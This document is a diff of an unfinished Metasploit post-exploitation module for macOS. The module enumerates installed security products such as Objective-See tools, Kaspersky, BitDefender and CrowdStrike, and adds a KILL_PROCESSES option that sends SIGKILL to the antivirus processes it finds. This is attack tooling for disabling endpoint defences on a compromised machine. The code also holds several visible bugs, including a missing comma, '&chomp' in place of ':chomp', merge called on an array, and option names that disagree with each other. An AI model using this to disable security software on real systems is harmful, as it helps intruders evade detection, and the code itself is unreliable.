@@ -18,10 +18,10 @@ class MetasploitModule < Msf::Post
         'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
         'Description' => %q{
           This module enumerates OSX systems for the presence of antivirus products. Target Products include: Objective-Cee, Kaspersky,
-          BitDefender and CrowdStrike. Presence of these products is determined through file system artifiacts and process names. Enumeration 
-          of additional products can be done through the CUSTOM_PROCESSES and CUSTOM_FILES options. The KILL_PROCESSES option will atempt to 
-          send a kill signal to each of the process id's found in this module. Root privilleges are required for this capability.
-        },
+          BitDefender and CrowdStrike. Installation is determined via file artifiacts and processes. The CUSTOM_PRODS option specifies
+          a file which contains a list of additional security products to hunt for, each of which will be seperated by a new 
+          line character. If run with root privilleges the KILL_PROCESSES option will send a kill signal to the security processes detected 
+          by this module. },
         'License' => MSF_LICENSE,
         'Author' => [ 'gardnerapp', 'cdelafuente-r7' ],
         'Platform' => [ 'osx' ],
@@ -35,9 +35,10 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('CUSTOM_PROCESSES', 
-                      true, ['File containing process names to hunt for. Each value should be seperated by a newline character', '']),
+                      true, ['File containing process names to hunt for. Each value should be seperated by a newline character']),
         OptString.new('CUSTOM_FILES',
-                      true, ['File containing files and directories to hunt for. Each value should be seperated by a newline character', '']),
+                      true, ['File containing files and directories to hunt for. Each value should be seperated by a newline character']),
+        OptBool.new('KILL_PROCESSES', false ['Send a SIGKILL signal to all of the processes this module finds, including custom processes'])
       ]
     )
   end
@@ -53,29 +54,51 @@ class MetasploitModule < Msf::Post
 
   def objective_see
     ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight']
-     # .map! {|p| "/Applications/#{p}.app"}
   end 
 
-  def kapersky; end 
-  def bitdefender; end 
-  def crowdstrike; end 
+  # a list of folders where security objects may be installed. 
+  # Need a case insensitive search of directory listings from these locations.
+  def security_paths
+    ['/Applications/', '/Library/', '/Library/LaunchAgents/', '/Library/LaunchAgents/', '/Library/Security/', 
+     '/Library/Security/SecurityAgentPlugins/']
+  end 
 
-  # good acessory canidate method
+  # Not sure what the file names of these products will be, needs more research. 
+  def kapersky
+    ['kapersky']
+  end 
+
+  def bitdefender
+    ['bitdefender']
+  end 
+
+  def crowdstrike
+    ['crowdstrike']
+  end 
+
+  # good canidate for an acessory method
+  # reads a file and returns each line as an element in an array
   def file_to_array(file)
     f = File.open file
     f.readlines.map(&chomp)
   end 
 
-  def all_products
-    all = []
-    %i[objective_see kapersky bitdefender crowdstrike].each {|p| all.merge p}
+  def custom
+    file_to_array datastore['CUSTOM_PRODS']
   end 
 
-  def enum_processes(proc_array)
-    @processes.select do |element|
-      proc_array.each do |process| 
-        return true if element =~ /#{process}/i # this may only in the block or out of enum_processes need to test this method thuroughly 
-      end
+  def all_products
+    all = []
+    %i[objective_see kapersky bitdefender crowdstrike custom].each {|p| all.merge p}
+
+  end 
+
+  def enum_processes(product)
+    @processes.each do |process|
+      if process['name'] =~ /#{product}/i
+        @running_process.push(process)
+        print_good("Found potential process artifact #{process.inspect}")
+      end 
     end 
   end
 
@@ -84,7 +107,6 @@ class MetasploitModule < Msf::Post
   end 
 
   def run
-    # TODO test, get more products. Test custom file, reading file. 
     print_status('Retrieving process list...')
     @processes = get_processes
 
